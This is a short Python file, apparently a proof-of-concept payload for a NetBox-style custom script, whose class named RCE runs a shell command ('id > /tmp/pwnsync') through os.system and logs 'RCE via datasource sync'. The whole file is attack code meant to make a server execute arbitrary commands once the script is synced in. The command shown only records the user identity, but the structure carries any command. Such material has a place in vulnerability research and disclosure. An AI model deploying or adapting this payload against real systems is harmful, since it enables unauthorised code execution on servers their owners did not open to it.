from extras.scripts import Script
import os
class RCE(Script):
    class Meta:
        name = "rce"
    def run(self, data, commit):
        os.system('id > /tmp/pwnsync')
        self.log_info("RCE via datasource sync")
